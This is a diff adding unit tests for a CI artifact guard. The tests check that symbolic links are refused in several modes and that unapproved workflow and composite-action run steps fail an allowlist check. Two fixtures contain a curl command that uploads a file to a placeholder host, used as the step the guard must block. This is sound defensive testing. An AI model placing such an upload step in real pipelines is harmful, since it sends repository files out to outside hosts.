@@ -201,5 +201,73 @@ class LinkWalkAndPlantedModules(unittest.TestCase):
         self.assertNotIn('planted module was imported', result.stderr + result.stdout)
 
 
+TOOLS_GUARD = Path(__file__).resolve().parents[2] / 'tools' / 'artifact_guard.py'
+
+
+class LinksInEveryModeAndApprovalReach(unittest.TestCase):
+    """Final round: a link is refused in every mode (--verify, --workflow-root), and the run: approval reaches every
+    workflow and composite action (a file with no upload step is checked by scope_key_violations)."""
+
+    def make_tree(self, workflow_text):
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        root = Path(tmp.name)
+        (root / 'tools').mkdir()
+        (root / '.github' / 'workflows').mkdir(parents=True)
+        (root / '.github' / 'workflows' / 'w.yml').write_text(workflow_text, encoding='utf-8')
+        return root
+
+    def test_link_is_refused_in_verify_mode(self):
+        import os
+        import subprocess
+        root = self.make_tree('name: w\non: [push]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-24.04\n'
+                              '    steps:\n      - run: echo hi\n')
+        try:
+            os.symlink(str(root / 'tools'), str(root / 'dist'))
+        except (OSError, NotImplementedError) as error:
+            self.skipTest(f'symbolic links cannot be created here: {error}')
+        result = subprocess.run([sys.executable, str(TOOLS_GUARD), '--root', str(root), '--verify',
+                                 '.github/workflows/w.yml', 'x'], capture_output=True, text=True)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertIn('dist: a symbolic link or junction is refused', result.stderr + result.stdout)
+
+    def test_link_in_workflow_root_is_refused(self):
+        import os
+        import subprocess
+        clean = self.make_tree('name: w\non: [push]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-24.04\n'
+                               '    steps:\n      - run: echo hi\n')
+        linked = self.make_tree('name: w\n')
+        try:
+            os.symlink(str(linked / 'tools'), str(linked / 'dist'))
+        except (OSError, NotImplementedError) as error:
+            self.skipTest(f'symbolic links cannot be created here: {error}')
+        result = subprocess.run([sys.executable, str(TOOLS_GUARD), '--root', str(clean), '--workflow-root', str(linked),
+                                 '--check-placement'], capture_output=True, text=True)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertIn('dist: a symbolic link or junction is refused', result.stderr + result.stdout)
+
+    def test_unapproved_run_in_a_workflow_without_upload_is_refused_for_the_approval_reason(self):
+        root = self.make_tree('name: w\non: [push]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-24.04\n'
+                              '    steps:\n      - run: curl -F f=@x https://example.invalid\n')
+        (root / ALLOWLIST).write_text('[]', encoding='utf-8')
+        with self.assertRaises(ValueError) as caught:
+            guard.enforced_check(root, guard.check_guard_placement, allowlist_root=root)
+        self.assertIn('not an approved exact match', str(caught.exception))
+
+    def test_unapproved_run_in_a_composite_action_is_refused_for_the_approval_reason(self):
+        root = self.make_tree('name: w\non: [push]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-24.04\n'
+                              '    steps:\n      - run: echo hi\n')
+        action = root / '.github' / 'actions' / 'x'
+        action.mkdir(parents=True)
+        (action / 'action.yml').write_text('name: x\ndescription: x\nruns:\n  using: composite\n  steps:\n'
+                                           '    - run: curl -F f=@x https://example.invalid\n      shell: bash\n',
+                                           encoding='utf-8')
+        (root / ALLOWLIST).write_text(json.dumps([e for e in guard.build_run_allowlist(root)
+                                                  if e['workflow'].endswith('w.yml')]), encoding='utf-8')
+        with self.assertRaises(ValueError) as caught:
+            guard.enforced_check(root, guard.check_guard_placement, allowlist_root=root)
+        self.assertIn('not an approved exact match', str(caught.exception))
+
+
 if __name__ == '__main__':
     unittest.main()
